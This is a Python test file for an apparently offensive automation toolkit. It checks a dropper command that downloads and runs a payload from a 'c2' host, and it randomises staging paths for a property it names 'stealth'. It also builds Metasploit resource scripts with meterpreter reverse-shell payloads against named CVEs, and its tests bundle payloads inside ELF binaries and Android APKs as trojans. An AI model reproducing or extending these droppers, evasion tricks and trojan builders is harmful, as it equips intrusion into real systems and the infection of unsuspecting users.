"""Quality tests for the dynamic command layer.

These pin down the properties the dynamic commands must guarantee:
- CORRECTNESS: rewriting an ephemeral staging path never breaks the command
  (the same path is rewritten consistently within one command);
- STEALTH: consecutive runs never ship the same staging path twice, while a
  seeded run is fully reproducible (operator/scripted replay);
- EFFECTIVENESS: version-matched exploit commands target the right
  host/port/software and carry a parseable marker;
- ROBUSTNESS: malformed carriers and unsupported layouts fail loudly.
"""
import os
import tempfile
import unittest
from unittest.mock import Mock

from phantom.automation.belief import WorldModel
from phantom.automation.guidance.dynamics import DynCommandBuilder
from phantom.automation.exploit.modules import module_registry
from phantom.automation.exploit.synthesis import (
    build_resource_script, synthesize_command)

TARGET = "10.0.0.5"

DROPPER = ("curl -sk https://c2/api/v1/payload -o /tmp/.cache "
           "&& chmod +x /tmp/.cache && /tmp/.cache 10.0.0.5 8080 0")


def _wm(os_name=""):
    wm = WorldModel(target=TARGET, target_type="ip")
    if os_name:
        wm.add_finding("os", "detected",
                       {"name": os_name, "accuracy": 90},
                       confidence=0.9, source="nmap")
    return wm


class TestShapeCorrectness(unittest.TestCase):
    """The rewritten command must still be the SAME command semantically."""

    def test_same_path_rewritten_consistently(self):
        out = DynCommandBuilder(seed=1).shape(DROPPER, _wm())
        # write → chmod → exec must reference the SAME new path
        written = out.split("-o ")[1].split(" ")[0]
        self.assertEqual(out.count(written), 3,
                         "every occurrence of the staging path must agree")
        self.assertNotIn("/tmp/.cache", out)

    def test_surrounding_command_untouched(self):
        builder = DynCommandBuilder(seed=2)
        cmd = "curl -sk https://c2/x -o /tmp/.update && chmod +x /tmp/.update"
        out = builder.shape(cmd, _wm())
        self.assertTrue(out.startswith("curl -sk https://c2/x -o /tmp/."))
        staged = out.split("-o ")[1].split(" ")[0]
        self.assertTrue(out.endswith(f"&& chmod +x {staged}"))

    def test_distinct_paths_get_distinct_values(self):
        cmd = "curl -o /tmp/.a /tmp/.b && cat /tmp/.a"
        out = DynCommandBuilder(seed=3).shape(cmd, _wm())
        a = out.split("-o ")[1].split(" ")[0]
        b = out.split("/tmp/.")[2].split(" ")[0]
        self.assertNotEqual(a, b)

    def test_unchanged_without_staging_path(self):
        cmd = "nmap -sV --script vulners 10.0.0.5"
        self.assertEqual(
            DynCommandBuilder(seed=4).shape(cmd, _wm("Windows 11")), cmd)

    def test_platform_detected_from_wm(self):
        out = DynCommandBuilder(seed=5).shape(DROPPER, _wm("Windows 11"))
        self.assertIn("$env:TEMP\\", out)
        out2 = DynCommandBuilder(seed=6).shape(DROPPER, _wm("Linux 5.15"))
        self.assertIn("/tmp/.", out2)

    def test_explicit_platform_wins(self):
        out = DynCommandBuilder(seed=7).shape(DROPPER, _wm("Windows 11"),
                                              platform="linux")
        self.assertIn("/tmp/.", out)

    def test_windows_path_regex(self):
        cmd = "powershell -c Invoke-WebRequest c2 -OutFile $env:TEMP\\.sync"
        out = DynCommandBuilder(seed=8).shape(cmd, _wm("Windows 11"))
        self.assertNotIn("$env:TEMP\\.sync", out)
        self.assertIn("$env:TEMP\\", out)


class TestShapeStealth(unittest.TestCase):
    """Per-run variation vs seeded reproducibility."""

    def test_unseeded_runs_never_repeat_path(self):
        a = DynCommandBuilder().shape(DROPPER, _wm())
        b = DynCommandBuilder().shape(DROPPER, _wm())
        c = DynCommandBuilder().shape(DROPPER, _wm())
        self.assertNotEqual(a, b)
        self.assertNotEqual(b, c)

    def test_same_seed_reproduces_exact_command(self):
        a = DynCommandBuilder(seed=99).shape(DROPPER, _wm())
        b = DynCommandBuilder(seed=99).shape(DROPPER, _wm())
        self.assertEqual(a, b)

    def test_ephemeral_format_per_platform(self):
        b = DynCommandBuilder(seed=10)
        self.assertTrue(b.next_ephemeral("linux").startswith("/tmp/."))
        self.assertTrue(b.next_ephemeral("windows").startswith("$env:TEMP\\"))
        self.assertTrue(b.next_ephemeral("android").startswith("$TMPDIR/."))


class TestSynthesisEffectiveness(unittest.TestCase):
    """Version-matched commands must target the right host/port/software."""

    def setUp(self):
        self.apache = module_registry.get("CVE-2021-41773")

    def test_auxiliary_module_has_no_payload(self):
        ssh = module_registry.get("CVE-2018-15473")
        rc = build_resource_script(ssh, TARGET, "22")
        self.assertIn("use auxiliary/scanner/ssh/ssh_enumusers", rc)
        self.assertNotIn("PAYLOAD", rc)

    def test_rce_resource_script_has_full_payload(self):
        from phantom.automation.exploit.payloads import PayloadFactory
        spec = PayloadFactory(seed=1).spec("linux", "x64")
        rc = build_resource_script(self.apache, TARGET, "80", spec,
                                   lhost="10.0.0.1", lport=4444)
        self.assertIn(f"set RHOSTS {TARGET}", rc)
        self.assertIn("set RPORT 80", rc)
        self.assertIn("set PAYLOAD linux/x64/meterpreter_reverse_tcp", rc)
        self.assertIn("set LHOST 10.0.0.1", rc)
        self.assertIn("run", rc)

    def test_marker_roundtrip(self):
        cmd = synthesize_command(self.apache, TARGET, "80")
        marker = cmd.split('&& echo "')[1][:-1]
        self.assertTrue(marker.startswith("EXPLOIT:"))
        for token in ("cve=CVE-2021-41773", "software=apache",
                      f"target={TARGET}", "port=80",
                      "msf=exploit/multi/http/apache_normalize_path_rce"):
            self.assertIn(token, marker)

    def test_quotes_escaped_in_resource_script(self):
        module = module_registry.get("CVE-2017-5638")
        cmd = synthesize_command(module, TARGET, "8080")
        self.assertIn('msfconsole -q -x "', cmd)

    def test_payload_staging_path_never_static_across_factory_runs(self):
        from phantom.automation.exploit.payloads import PayloadFactory
        a = PayloadFactory(seed=21).spec("linux", "x64").staging_path
        b = PayloadFactory(seed=22).spec("linux", "x64").staging_path
        self.assertNotEqual(a, b)


class TestCarrierRobustness(unittest.TestCase):
    """Bundling must stay correct and fail loudly on malformed carriers."""

    def setUp(self):
        self.base = tempfile.mkdtemp()
        self.payload = os.path.join(self.base, "payload.bin")
        with open(self.payload, "wb") as f:
            f.write(b"\x90" * 128)

    def _apk(self):
        import zipfile
        path = os.path.join(self.base, "app.apk")
        with zipfile.ZipFile(path, "w") as z:
            z.writestr("classes.dex", b"\x00" * 64)
            z.writestr("res/values/strings.xml", b"<s/>")
        return path

    def test_overlay_layout_still_detected(self):
        from phantom.utils.trojan_bundle import (
            build_trojan_bundle, bundle_info, parse_bundle)
        legit = os.path.join(self.base, "bin")
        with open(legit, "wb") as f:
            f.write(b"\x7fELF" + os.urandom(256))
        out = os.path.join(self.base, "evil.bin")
        info = build_trojan_bundle(legit, self.payload, out)
        self.assertEqual(info.layout, "overlay")
        parsed = bundle_info(out)
        self.assertEqual(parsed.payload_size, info.payload_size)
        self.assertEqual(parse_bundle(out)[1],
                         open(self.payload, "rb").read())

    def test_truncated_zip_rejected(self):
        from phantom.utils.trojan_bundle import build_trojan_bundle
        apk = self._apk()
        data = open(apk, "rb").read()
        truncated = os.path.join(self.base, "broken.apk")
        with open(truncated, "wb") as f:
            f.write(data[: len(data) // 2])
        with self.assertRaises(ValueError):
            build_trojan_bundle(truncated, self.payload,
                                os.path.join(self.base, "x.apk"))

    def test_zip_with_subdirectory_carrier_roundtrip(self):
        import zipfile
        from phantom.utils.trojan_bundle import (
            build_trojan_bundle, extract_payload)
        apk = self._apk()
        out = os.path.join(self.base, "evil.apk")
        build_trojan_bundle(apk, self.payload, out)
        with zipfile.ZipFile(out) as z:
            self.assertIn("res/values/strings.xml", z.namelist())
            self.assertEqual(z.read("res/values/strings.xml"), b"<s/>")
        self.assertEqual(extract_payload(out),
                         open(self.payload, "rb").read())


if __name__ == "__main__":
    unittest.main()